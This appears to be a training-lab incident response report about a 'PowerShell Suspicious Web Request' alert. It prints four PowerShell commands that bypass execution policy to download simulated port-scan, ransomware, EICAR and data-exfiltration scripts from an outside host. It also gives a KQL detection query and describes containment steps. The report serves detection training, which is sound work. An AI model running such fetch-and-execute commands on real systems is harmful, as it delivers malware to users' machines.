# Incident Response Report (PowerShell Suspicious Web Request)

## Work Incident

This incident was handled following the `NIST 800-61 Incident Response Lifecycle`:

**Preparation → Detection & Analysis → Containment/Eradication/Recovery → Post-Incident Activities**
<img width="300" height="326" alt="image" src="https://github.com/user-attachments/assets/0cc47bb6-88b3-47b4-a5fd-6635e7257040" />

---
**1. Preparation**
- Roles, responsibilities, and incident response procedures are documented.
- Analytics rules and security monitoring are already in place to detect suspicious activity.
<img width="300" height="500" alt="image" src="https://github.com/user-attachments/assets/f112f60e-07c1-4edb-bf13-97cf6126d46c" />
<img width="300" height="500" alt="image" src="https://github.com/user-attachments/assets/2913b327-9921-4cb8-bec8-98593436a00b" />
<img width="300" height="500" alt="image" src="https://github.com/user-attachments/assets/a679266b-6081-46c0-a4ee-9305bc476098" />

---

**2. Detection and Analysis**
A security alert titled “PowerShell Suspicious Web Request” was triggered on `windows-target-1`.
Investigation revealed that a user initiated four separate PowerShell commands that downloaded four different scripts.
## PowerShell Commands Executed
```
powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1

powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1

powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1 -OutFile C:\programdata\eicar.ps1

cmd.exe /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1
```

**Downloaded Scripts**
- portscan.ps1
- pwncrypt.ps1
- eicar.ps1
- exfiltratedata.ps1

**User Interview**

The user reported attempting to install a “free software.” They stated a black window briefly appeared and nothing else happened.

**Execution Confirmation**

Using Microsoft Defender for Endpoint logs and KQL, it was confirmed that the downloaded scripts were executed on the device.

## KQL Query Used
```
let TargetHostname = "windows-target-1";
let ScriptNames = dynamic(["eicar.ps1", "exfiltratedata.ps1", "portscan.ps1", "pwncrypt.ps1"]);
DeviceProcessEvents
| where DeviceName == TargetHostname
| where FileName == "powershell.exe"
| where ProcessCommandLine contains "-File" and ProcessCommandLine has_any (ScriptNames)
| order by TimeGenerated
| project TimeGenerated, AccountName, DeviceName, FileName, ProcessCommandLine
```
**Malware Analysis Summary**
The scripts were sent to the malware reverse engineering team. Their analysis identified each script as a simulated malicious activity:

- `portscan.ps1`
Scans a range of IP addresses for open ports from a list of common ports and logs the results.
- `eicar.ps1`
Creates an EICAR test file used for antivirus testing and logs activity.
- `exfiltratedata.ps1`
Generates fake employee data, compresses it into a ZIP file, and uploads it to an Azure Blob Storage container, simulating data exfiltration.
- `pwncrypt.ps1`
Encrypts files on the user's desktop, simulating ransomware behavior, and drops a ransom note.

---
**3. Containment, Eradication & Recovery**
- The affected device was isolated in Microsoft Defender for Endpoint to prevent further spread.
- A full antivirus scan was executed while the system was isolated.
- Once the machine was confirmed clean, it was released from isolation and returned to normal operation.
<img width="400" height="509" alt="image" src="https://github.com/user-attachments/assets/cd105263-7306-49b7-832d-0b532f58a93a" />

---
**4. Post-Incident Activities**
- The user was required to complete additional cybersecurity awareness training.
- Cyber awareness training package (KnowBe4) was upgraded and frequency of phishing/safety campaigns was increased.
- Initiated implementation of a new PowerShell usage restriction policy for non-essential users.
